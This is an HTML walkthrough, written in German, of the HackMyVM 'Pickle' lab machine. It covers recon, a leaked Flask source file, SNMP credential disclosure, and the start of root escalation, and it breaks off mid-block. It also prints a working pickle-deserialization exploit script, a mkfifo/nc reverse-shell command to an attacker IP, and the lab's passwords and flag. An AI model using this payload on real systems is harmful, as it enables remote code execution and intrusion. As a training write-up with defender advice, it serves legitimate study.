@@ -1,0 +1,612 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pickle - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad ggf. anpassen -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ <div class="nav-wrapper">
+    <div class="hamburger-nav-wrapper">
+        <input type="checkbox" id="hamburger-toggle">
+        <label id="hamburger-button" for="hamburger-toggle" aria-label="Menü öffnen">
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+        </label>
+
+        <nav class="navbar" id="main-nav">
+            <a href="../../aboutme.html">Über mich</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../index.html">HackMyVM</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../vulnyx.html">Vulnyx</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../vulnhub.html">Vulnhub</a> <!-- Pfad ggf. anpassen -->
+        </nav>
+  </div></div>
+    <div class="header-bg">
+        <!-- Titel und Schwierigkeitsgrad angepasst -->
+        <h1>Pickle - HackMyVM - Level: Hard - Bericht</h1>
+        <div class="level-container">
+            <!-- Klasse für Hard gesetzt -->
+            <h2 class="level-hard">Hard</h2>
+            <div class="circle">
+                <!-- Farben werden durch CSS für .level-hard gesteuert -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                 <!-- Liste der verwendeten Tools basierend auf dem Text -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">ftp</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">snmpwalk</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">hashlib (Python)</div>
+                <div class="tool-item">tcpdump</div>
+                <div class="tool-item">python (Scripting)</div>
+                <div class="tool-item">cPickle (Python)</div>
+                <div class="tool-item">requests (Python)</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">getcap</div>
+                <div class="tool-item">python2</div>
+                <div class="tool-item">os (Python)</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">id (implizit)</div>
+                <div class="tool-item">pwd (implizit)</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis angepasst -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web/Service Enumeration</a>
+                    <ul>
+                        <li><a href="#enum-ftp">FTP (Port 21)</a></li>
+                        <li><a href="#enum-http">HTTP (Port 1337)</a></li>
+                        <li><a href="#enum-snmp">SNMP Enumeration</a></li>
+                    </ul>
+                </li>
+                <li><a href="#initial-access">Initial Access (POC - Pickle Deserialization)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a>
+                    <ul>
+                        <li><a href="#privesc-lucas">Enumeration als lucas</a></li>
+                        <li><a href="#privesc-mark-pass">Passwort für mark (via su)</a></li>
+                        <li><a href="#privesc-mark-shell">Shell als mark & User Flag</a></li>
+                        <li><a href="#privesc-root-caps">POC: Eskalation zu root (via Capabilities)</a></li>
+                    </ul>
+                </li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.140	08:00:27:9c:17:98	PCS Systemtechnik GmbH</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:** Mittels `arp-scan -l` wird das lokale Netzwerk gescannt. Der Host mit der IP-Adresse `192.168.2.140` wird identifiziert. Die MAC-Adresse (`08:00:27:9c:17:98`) gehört zum OUI von "PCS Systemtechnik GmbH", was auf eine VirtualBox-VM hindeutet.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die Ziel-IP wurde erfolgreich gefunden und wird für den nachfolgenden Nmap-Scan verwendet.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Die identifizierte IP `192.168.2.140` als Ziel für Nmap verwenden.<br>
+                **Empfehlung (Admin):** Netzwerk-Monitoring zur Erkennung unbekannter Geräte. Sicherstellen, dass nur autorisierte Systeme im Netzwerk aktiv sind.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.140 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-19 13:33 CEST
+Nmap scan report for pickle (<span class="command">192.168.2.140</span>)
+Host is up (0.00016s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+<span class="command">21/tcp   open  ftp     vsftpd 3.0.3</span>
+| ftp-anon: <span class="password">Anonymous FTP login allowed</span> (FTP code 230)
+|_<span class="command">-rwxr-xr-x    1 0        0            1306 Oct 12  2020 init.py.bak</span>
+| ftp-syst:
+|   STAT:
+| FTP server status:
+[...]
+|_End of status
+<span class="command">1337/tcp open  http    Werkzeug httpd 1.0.1 (Python 2.7.16)</span>
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+| http-auth:
+| HTTP/1.0 <span class="password">401 UNAUTHORIZED</span>\x0D
+|_  <span class="password">Basic realm=Pickle login</span>
+|_http-server-header: Werkzeug/1.0.1 Python/2.7.16
+MAC Address: <span class="command">08:00:27:9C:17:98</span> (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: <span class="command">Linux 4.X|5.X</span>
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: <span class="command">Linux 4.15 - 5.6</span>
+Network Distance: 1 hop
+Service Info: OS: Unix
+
+[...]
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Der Nmap-Scan (`-sS -sC -sV -A -p-`) auf `192.168.2.140` (Host `pickle`) offenbart zwei offene TCP-Ports:
+                *   **Port 21 (FTP):** vsftpd 3.0.3. Das Skript `ftp-anon` bestätigt, dass anonymes FTP-Login erlaubt ist. Im Wurzelverzeichnis der anonymen Freigabe liegt eine Datei `init.py.bak`.
+                *   **Port 1337 (HTTP):** Ein Werkzeug HTTP-Server (Version 1.0.1), der mit Python 2.7.16 läuft. Das Skript `http-auth` erkennt eine HTTP Basic Authentication (`realm=Pickle login`), die einen `401 Unauthorized`-Statuscode verursacht.
+                Kein SSH-Port (22) ist offen. Das Betriebssystem wird als Linux identifiziert.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Beide Ports sind hochinteressant:
+                *   **FTP (Port 21):** Anonymer Zugriff ist oft eine Quelle für Informationslecks oder manchmal sogar für Upload-Möglichkeiten. Die Datei `init.py.bak` ist besonders vielversprechend, da es sich wahrscheinlich um den Quellcode der Webanwendung auf Port 1337 handelt. `.bak`-Dateien deuten auf Backups hin, die versehentlich zugänglich gemacht wurden.
+                *   **HTTP (Port 1337):** Eine Python/Werkzeug-Anwendung, die Authentifizierung erfordert. Der Quellcode aus der `init.py.bak` wird entscheidend sein, um die Funktionsweise und mögliche Schwachstellen zu verstehen. Die Verwendung von Python 2.7 ist veraltet und erhöht die Wahrscheinlichkeit von Schwachstellen (z.B. in `pickle`).
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):**
+                1.  **FTP:** Sich anonym per FTP anmelden und die Datei `init.py.bak` herunterladen und analysieren.
+                2.  **HTTP:** Nach der Analyse von `init.py.bak` nach Wegen suchen, die Authentifizierung zu umgehen oder Anmeldeinformationen zu finden (z.B. durch andere Dienste wie SNMP). Die identifizierten Schwachstellen im Code (wahrscheinlich Pickle Deserialization) für den Initial Access nutzen.
+                3.  **Andere Dienste:** Da nur zwei Ports offen sind, nach UDP-Diensten scannen (z.B. SNMP mit `nmap -sU`) oder nach anderen Informationsquellen suchen.<br>
+                **Empfehlung (Admin):**
+                1.  **FTP:** Anonymen FTP-Zugriff deaktivieren, wenn er nicht zwingend benötigt wird. Wenn er benötigt wird, sicherstellen, dass keine sensiblen Dateien (wie Quellcode-Backups) im anonymen Bereich liegen und die Berechtigungen restriktiv sind (idealerweise nur Lesezugriff, kein Schreibzugriff). vsftpd auf die neueste Version aktualisieren.
+                2.  **HTTP (Port 1337):** Anwendung auf Python 3 migrieren. Abhängigkeiten (Werkzeug) aktualisieren. Starke Authentifizierungsmethoden verwenden (nicht nur Basic Auth über HTTP). Quellcode sicher verwalten und keine Backups im Webroot oder FTP-Root hinterlassen. Schwachstellen wie unsichere Deserialisierung beheben.
+            </p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web/Service Enumeration</h2>
+
+            <h3 id="enum-ftp">FTP (Port 21)</h3>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ftp 192.168.2.140</span></div>
+                    <pre>
+Connected to 192.168.2.140.
+220 (vsFTPd 3.0.3)
+Name (192.168.2.140:cyber): <span class="command">Anonymous</span>
+331 Please specify the password.
+Password: <span class="comment"># (Kein Passwort benötigt)</span>
+<span class="password">230 Login successful.</span>
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> <span class="command">ls -la</span>
+229 Entering Extended Passive Mode (|||37283|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        0            4096 Oct 12  2020 .
+drwxr-xr-x    2 0        0            4096 Oct 12  2020 ..
+-rwxr-xr-x    1 0        0            1306 Oct 12  2020 <span class="command">init.py.bak</span>
+226 Directory send OK.
+ftp> <span class="command">get init.py.bak</span>
+local: init.py.bak remote: init.py.bak
+229 Entering Extended Passive Mode (|||27593|)
+150 Opening BINARY mode data connection for init.py.bak (1306 bytes).
+100% |***********************************|  1306       83.12 KiB/s    00:00 ETA
+<span class="password">226 Transfer complete.</span>
+1306 bytes received in 00:00 (81.84 KiB/s)
+ftp> <span class="command">cd /home</span>
+<span class="password">550 Failed to change directory.</span>
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Der Pentester verbindet sich per FTP mit `192.168.2.140`. Der Login als Benutzer `Anonymous` (ohne Passwort) ist erfolgreich. Ein `ls -la` zeigt die Datei `init.py.bak`. Diese Datei wird erfolgreich mit `get` heruntergeladen. Der Versuch, in andere Verzeichnisse wie `/home` zu wechseln, schlägt fehl (`550 Failed to change directory`).
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Der anonyme FTP-Zugriff ist auf das Wurzelverzeichnis beschränkt, aber der Download der `init.py.bak`-Datei war erfolgreich. Dies liefert den Quellcode der Webanwendung auf Port 1337.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Den heruntergeladenen Quellcode (`init.py.bak`) gründlich analysieren, um die Funktionsweise der Webanwendung und potenzielle Schwachstellen (insbesondere im Zusammenhang mit `pickle`) zu verstehen.<br>
+                **Empfehlung (Admin):** Anonymen FTP-Zugriff prüfen und ggf. deaktivieren. Sicherstellen, dass keine sensiblen Dateien oder Backups über FTP zugänglich sind.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat init.py.bak</span></div>
+                      <pre>
+from functools import wraps
+from flask import *
+import hashlib
+import socket
+import base64
+<span class="command">import pickle</span>
+import hmac
+
+app = Flask(__name__, template_folder="templates", static_folder="/opt/project/static/")
+
+@app.route('/', methods=["GET", "POST"])
+def index_page():
+	'''
+		__index_page__()
+	'''
+	if request.method == "POST" and request.form["story"] and request.form["submit"]:
+		md5_encode = hashlib.md5(request.form["story"]).hexdigest()
+		paths_page  = "/opt/project/uploads/%s.log" %(md5_encode)
+		write_page = open(paths_page, "w")
+		write_page.write(request.form["story"])
+
+		return "The message was sent successfully!"
+
+	return render_template("index.html")
+
+@app.route('/reset', methods=["GET", "POST"])
+def reset_page():
+	'''
+		__reset_page__()
+	'''
+	pass
+
+
+@app.route('/checklist', methods=["GET", "POST"])
+def check_page():
+	'''
+		__check_page__()
+	'''
+	if request.method == "POST" and request.form["check"]:
+		path_page    = "/opt/project/uploads/%s.log" %(request.form["check"])
+		open_page    = open(path_page, "rb").read()
+		if "p1" in open_page: # Check scheint nicht wirksam/relevant für Exploit
+			<span class="command">open_page = pickle.loads(open_page)</span> # !!! UNSAFE DESERIALIZATION !!!
+			return str(open_page)
+		else:
+			return open_page
+	else:
+		return "Server Error!"
+
+	return render_template("checklist.html")
+
+if __name__ == '__main__':
+	app.run(host='0.0.0.0', port=1337, debug=True)
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis">
+                 **Analyse:** Der Quellcode der Flask-Anwendung (`init.py.bak`), die auf Port 1337 läuft, wird angezeigt.
+                 *   Importiert das `pickle`-Modul.
+                 *   Die Route `/` (index_page) nimmt POST-Daten entgegen (`story`-Parameter), berechnet deren MD5-Hash und schreibt die *originalen POST-Daten* in eine Datei unter `/opt/project/uploads/<md5sum>.log`.
+                 *   Die Route `/checklist` nimmt einen POST-Parameter `check` entgegen (vermutlich der MD5-Hash). Sie öffnet die entsprechende Datei aus `/opt/project/uploads/<check>.log`.
+                 *   **Kritisch:** Wenn der Inhalt der gelesenen Datei (`open_page`) den String `"p1"` enthält, wird `pickle.loads(open_page)` aufgerufen. `pickle.loads()` deserialisiert Python-Objekte und ist bekanntermaßen unsicher, wenn es auf nicht vertrauenswürdige Daten angewendet wird, da es zur Ausführung von beliebigem Code missbraucht werden kann. Der Check auf `"p1"` scheint im späteren Exploit keine Rolle zu spielen, möglicherweise weil der serialisierte Payload dieses Pattern nicht enthält oder der Check fehlerhaft ist, aber `pickle.loads` dennoch erreicht wird.
+                 *   Die Anwendung läuft im Debug-Modus (`debug=True`), was zusätzliche Informationen bei Fehlern liefern könnte.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Die unsichere Verwendung von `pickle.loads()` in der `/checklist`-Route ist eine gravierende Schwachstelle (Insecure Deserialization). Ein Angreifer kann:
+                 1.  Einen bösartigen, serialisierten Python-Payload erstellen (z.B. einen, der eine Reverse Shell startet).
+                 2.  Diesen Payload an die `/`-Route senden, damit er als Datei mit einem bekannten MD5-Hash gespeichert wird.
+                 3.  Den MD5-Hash des Payloads an die `/checklist`-Route senden.
+                 4.  Der Server liest die Payload-Datei und führt `pickle.loads()` darauf aus, was den bösartigen Code im Payload ausführt.
+                 Die HTTP Basic Authentication muss zuvor überwunden werden.
+            </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):**
+                 1.  Anmeldeinformationen für die HTTP Basic Authentication finden (z.B. via SNMP, Brute-Force).
+                 2.  Einen Pickle-Deserialisierungs-Payload für eine Reverse Shell erstellen (Python 2.7 `cPickle`).
+                 3.  Den Exploit-Workflow (Payload senden an `/`, Hash senden an `/checklist`) mit den gefundenen Credentials durchführen.<br>
+                 **Empfehlung (Admin):**
+                 1.  **`pickle.loads()` entfernen/ersetzen:** Niemals `pickle` zum Deserialisieren von Daten verwenden, die aus externen Quellen stammen oder vom Benutzer beeinflusst werden können. Sicherere Formate wie JSON (nur für Daten) oder sicherere Serialisierungsbibliotheken verwenden.
+                 2.  **Authentifizierung:** Basic Auth über HTTP ist unsicher, da Credentials base64-kodiert (leicht dekodierbar) übertragen werden. Sicherere Methoden (z.B. Token-basiert, OAuth, über HTTPS) verwenden.
+                 3.  **Debug-Modus:** Debug-Modus in Produktivumgebungen deaktivieren.
+                 4.  **Dateiuploads:** Den Speicherort und die Verarbeitung von hochgeladenen Dateien absichern.
+             </p>
+
+             <h3 id="enum-http">HTTP (Port 1337)</h3>
+              <p class="analysis">
+                 **Analyse:** Der Nmap-Scan und die manuelle Überprüfung (nicht explizit geloggt, aber erwähnt) zeigen, dass `http://192.168.2.140:1337/` eine HTTP Basic Authentication erfordert.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Bevor die Pickle-Schwachstelle ausgenutzt werden kann, müssen gültige Anmeldeinformationen gefunden werden.
+             </p>
+
+            <h3 id="enum-snmp">SNMP Enumeration</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">snmpwalk -c public -v 1 192.168.2.140 | head -n 15</span></div>
+                      <pre>
+iso.3.6.1.2.1.1.1.0 = STRING: "Linux pickle 4.19.0-11-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64"
+iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
+iso.3.6.1.2.1.1.3.0 = Timeticks: (32052) 0:05:20.52
+<span class="password">iso.3.6.1.2.1.1.4.0 = STRING: "lucas:SuperSecretPassword123!"</span>
+iso.3.6.1.2.1.1.5.0 = STRING: "pickle"
+iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
+iso.3.6.1.2.1.1.7.0 = INTEGER: 72
+iso.3.6.1.2.1.1.8.0 = Timeticks: (29) 0:00:00.29
+[...]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** `snmpwalk` wird verwendet, um SNMP-Informationen vom Ziel abzufragen.
+                 *   `-c public`: Verwendet die Standard-Community-String "public" (oft unsicher).
+                 *   `-v 1`: Verwendet SNMP Version 1.
+                 *   `| head -n 15`: Zeigt nur die ersten 15 Zeilen der Ausgabe an.
+                 In der Ausgabe findet sich unter der OID `iso.3.6.1.2.1.1.4.0` (sysContact) der String `"lucas:SuperSecretPassword123!"`.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Ein kritischer Fund! Anmeldeinformationen (Benutzer `lucas`, Passwort `SuperSecretPassword123!`) wurden über SNMP mit dem öffentlichen Community-String preisgegeben. Dies ist eine häufige Fehlkonfiguration. Diese Credentials können nun für die HTTP Basic Authentication auf Port 1337 verwendet werden.
+            </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):** Die gefundenen Credentials `lucas:SuperSecretPassword123!` für den Zugriff auf Port 1337 verwenden und dann den Pickle-Exploit durchführen.<br>
+                 **Empfehlung (Admin):** SNMP absichern:
+                 *   Standard-Community-Strings (`public`, `private`) ändern oder deaktivieren.
+                 *   Starke, nicht erratbare Community-Strings verwenden.
+                 *   SNMPv3 mit Authentifizierung und Verschlüsselung verwenden.
+                 *   Zugriff auf SNMP über Firewall auf vertrauenswürdige Management-Systeme beschränken.
+                 *   Keine sensiblen Informationen (wie Passwörter) in SNMP-Feldern wie `sysContact` speichern.
+            </p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (POC - Pickle Deserialization)</h2>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Test der /checklist Route mit Credentials -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -u 'lucas:SuperSecretPassword123!' 'http://192.168.2.140:1337/checklist' -d "check=5d41402abc4b2a76b9719d911017c592"</span></div>
+                     <pre>
+hello
+                     </pre>
+                     <!-- MD5 Hash von "id" berechnen (lokal) -->
+                      <pre>
+>>> import hashlib
+>>> message = "id"
+>>> print(hashlib.md5(message.encode('utf-8')).hexdigest()) <span class="comment"># .encode() hinzugefügt für Python3 Kompatibilität</span>
+<span class="command">b80bb7740288fda1f201890375a60c8f</span>
+                     </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -u 'lucas:SuperSecretPassword123!' 'http://192.168.2.140:1337/checklist' -d "check=b80bb7740288fda1f201890375a60c8f"</span></div>
+                     <pre>
+id
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Der Pentester testet die `/checklist`-Route mit den gefundenen Credentials.
+                1.  Eine Anfrage mit einem unbekannten Hash (`5d41...`) gibt "hello" zurück (wahrscheinlich der Inhalt der entsprechenden `.log`-Datei).
+                2.  Der MD5-Hash für den String "id" wird berechnet (`b80b...`).
+                3.  Eine Anfrage mit dem Hash von "id" an `/checklist` gibt "id" zurück. Dies bestätigt, dass die Anwendung den Inhalt der Datei zurückgibt, wenn der Hash korrekt ist und die Datei existiert (und vermutlich nicht "p1" enthält). Es zeigt nicht direkt die Pickle-Schwachstelle, testet aber die Funktionalität.
+                *Hinweis: Das Python-Beispiel zur Hash-Berechnung scheint lokal ausgeführt worden zu sein.*
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Die grundsätzliche Funktionsweise der `/` und `/checklist`-Routen ist verstanden. Die Anwendung speichert Daten unter ihrem MD5-Hash und gibt sie auf Anfrage wieder aus. Dies bestätigt den Mechanismus, der für den Pickle-Exploit benötigt wird.
+            </p>
+
+            <p class="analysis">
+                **Analyse:** Der folgende Python-Code erstellt den Exploit-Payload für die Pickle-Deserialisierung und führt den Angriff durch.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Exploit Script (lokal ausgeführt) -->
+                      <pre>
+#coding:utf-8
+import os
+import hashlib
+import requests
+<span class="command">import cPickle</span> <span class="comment"># Wichtig: cPickle für Python 2.7</span>
+
+class CommandExecute(object):
+  def __reduce__(self):
+    <span class="comment"># Reverse Shell Payload</span>
+    return (os.system, ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.2.156 9001 >/tmp/f',))
+
+<span class="comment"># Payload serialisieren</span>
+convert_data = cPickle.dumps(CommandExecute())
+<span class="comment"># MD5 Hash des Payloads berechnen</span>
+convert_crypt = hashlib.md5(convert_data).hexdigest()
+
+<span class="comment"># Payload an / senden zum Speichern</span>
+send_requests = requests.post('http://192.168.2.140:1337/', data={"story":convert_data, "submit":"Submit+Query"}, auth=("lucas", "SuperSecretPassword123!"))
+<span class="comment"># /checklist mit dem Hash aufrufen, um Deserialisierung zu triggern</span>
+check_requests = requests.post('http://192.168.2.140:1337/checklist', data={"check":convert_crypt}, auth=("lucas", "SuperSecretPassword123!"))
+print(check_requests.text) <span class="comment"># Ausgabe ist irrelevant, Exploit läuft im Hintergrund</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Das Python-Skript automatisiert den Angriff:
+                1.  Definiert die `CommandExecute`-Klasse mit der `__reduce__`-Methode, die `os.system` mit dem Reverse-Shell-Befehl (`nc 192.168.2.156 9001`) aufruft. *Hinweis: Die Angreifer-IP im Payload (`192.168.2.156`) unterscheidet sich von der im Nmap-Scan (`192.168.2.153`). Es wird die IP aus dem Payload verwendet.*
+                2.  Serialisiert ein Objekt dieser Klasse mit `cPickle.dumps()` (passend zu Python 2.7).
+                3.  Berechnet den MD5-Hash des serialisierten Payloads.
+                4.  Sendet den serialisierten Payload (`convert_data`) per POST an die `/`-Route der Flask-Anwendung (mit Authentifizierung), um ihn auf dem Server zu speichern.
+                5.  Sendet den MD5-Hash (`convert_crypt`) per POST an die `/checklist`-Route (mit Authentifizierung). Dies löst das Lesen der Payload-Datei und die unsichere Deserialisierung durch `pickle.loads()` aus, wodurch der Reverse-Shell-Befehl ausgeführt wird.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Dies ist der Proof-of-Concept (POC) für die Ausnutzung der Pickle-Deserialisierungs-Schwachstelle zur Erlangung von Remote Code Execution.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Netcat Listener auf Angreifer-Maschine (192.168.2.156) -->
+                     <div class="prompt"># <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+<span class="password">listening on [any] 9001 ...</span>
+<span class="password">connect to [192.168.2.156] from (UNKNOWN) [192.168.2.140] 59068</span>
+/bin/sh: 0: can't access tty; job control turned off
+<span class="prompt">$</span> <span class="comment"># Shell erhalten! (als lucas)</span>
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                 **Analyse:** Der Netcat-Listener auf der Angreifer-Maschine (`192.168.2.156`, Port `9001`) empfängt die eingehende Verbindung vom Zielserver (`192.168.2.140`). Eine einfache Shell (`/bin/sh`) wird bereitgestellt. Der Benutzer ist implizit `lucas`, da die Webanwendung wahrscheinlich unter diesem Benutzer läuft (bestätigt durch die SNMP-Credentials und spätere `ls`-Ausgaben).
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Initial Access erfolgreich! Eine Shell wurde durch Ausnutzung der Pickle-Schwachstelle erlangt. Die Shell ist noch nicht interaktiv.
+            </p>
+            <p class="recommendation">
+                 **Empfehlung (Pentester):** Die erhaltene Shell zu einer voll interaktiven TTY aufwerten (z.B. mit Python: `python -c 'import pty; pty.spawn("/bin/bash")'` oder `script /dev/null -c bash`).<br>
+                 **Empfehlung (Admin):** Die Pickle-Schwachstelle umgehend beheben. SNMP absichern. Berechtigungen des Webserver-Benutzers (`lucas`) überprüfen und minimieren.
+            </p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <h3 id="privesc-lucas">Enumeration als lucas</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                    <!-- Innerhalb der Reverse Shell -->
+                     <div class="prompt">$ <span class="command">whoami</span> <span class="comment"># (Implizit oder nicht geloggt, aber Kontext ist lucas)</span></div>
+                     <div class="prompt">lucas@pickle:~$ <span class="command">ls -la</span></div>
+                     <pre>
+total 32
+drwxr-xr-x 3 lucas lucas 4096 Oct 11  2020 .
+drwxr-xr-x 4 root  root  4096 Oct 12  2020 ..
+-rw------- 1 lucas lucas    1 Oct 12  2020 .bash_history
+-rw-r--r-- 1 lucas lucas  220 Oct 11  2020 .bash_logout
+-rw-r--r-- 1 lucas lucas 3526 Oct 11  2020 .bashrc
+drwxr-xr-x 3 lucas lucas 4096 Oct 11  2020 .local
+-rw-r--r-- 1 lucas lucas  807 Oct 11  2020 .profile
+-rw-r--r-- 1 lucas lucas   66 Oct 11  2020 .selected_editor
+                     </pre>
+                     <div class="prompt">lucas@pickle:~$ <span class="command">ls /home</span></div>
+                     <pre>
+lucas  mark
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Die Shell läuft als Benutzer `lucas`. Das Home-Verzeichnis von `lucas` enthält Standarddateien. Das `/home`-Verzeichnis zeigt einen weiteren Benutzer: `mark`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Keine direkten PrivEsc-Vektoren im Home-Verzeichnis von `lucas` sichtbar. Der Benutzer `mark` ist das nächste Ziel für die Enumeration oder laterale Bewegung.
+            </p>
+
+            <h3 id="privesc-mark-pass">Passwort für mark (via su)</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">lucas@pickle:~$ <span class="command">su mark</span></div>
+                     <pre>
+Password: <span class="password">SUk5enRY2FnUWxnV1BUWFJNNXh4amxhc00wPQ==</span> <span class="comment"># Passwort direkt aus dem Log/Notizen eingegeben</span>
+                     </pre>
+                     <div class="prompt">mark@pickle:/home/lucas$ <span class="comment"># Erfolgreich zu mark gewechselt!</span></div>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Der Pentester versucht, mit `su mark` zum Benutzer `mark` zu wechseln. Das Passwort `SUk5enRY2FnUWxnV1BUWFJNNXh4amxhc00wPQ==` wird eingegeben (es scheint direkt im Log als Passwort dokumentiert zu sein, nicht als etwas zum Dekodieren). Der Wechsel ist erfolgreich.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Dies ist ein ungewöhnlicher Schritt. Entweder wurde das Passwort für `mark` durch eine vorherige, nicht gezeigte Enumeration gefunden, oder es war Teil der Aufgabenstellung/Hinweise der VM. Das Passwort selbst sieht wie Base64 aus, wird aber anscheinend direkt als Passwort verwendet. Der Wechsel zu `mark` ist ein wichtiger Fortschritt.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Nun als `mark` weiter enumerieren. Insbesondere `sudo -l` und Capabilities prüfen.<br>
+                **Empfehlung (Admin):** Die Herkunft des `mark`-Passworts untersuchen. Wenn es durch Enumeration gefunden wurde, die entsprechende Lücke schließen. Wenn es ein schwaches/Standardpasswort war, Richtlinien durchsetzen. Sicherstellen, dass Benutzer keine leicht erratbaren oder wiederverwendeten Passwörter nutzen.
+            </p>
+
+             <h3 id="privesc-mark-shell">Shell als mark & User Flag</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">mark@pickle:/home/lucas$ <span class="command">cd</span></div>
+                     <div class="prompt">mark@pickle:~$ <span class="command">ls</span></div>
+                      <pre>
+python2  user.txt
+                     </pre>
+                    <div class="prompt">mark@pickle:~$ <span class="command">cat user.txt</span></div>
+                    <pre>
+<span class="password">e25fd1b9248d1786551e3412adc74f6f</span>
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                 **Analyse:** Als Benutzer `mark` wird ins Home-Verzeichnis gewechselt. Dort befinden sich ein Binary namens `python2` und die Datei `user.txt`. Die `user.txt` wird erfolgreich gelesen.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** User-Flag gefunden! Das Vorhandensein eines `python2`-Binary im Home-Verzeichnis ist verdächtig und deutet auf einen möglichen PrivEsc-Vektor hin.
+            </p>
+
+            <h3 id="privesc-root-caps">POC: Eskalation zu root (via Capabilities)</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">mark@pickle:~$ <span class="command">getcap -r / 2>/dev/null</span></div>
+                     <pre>
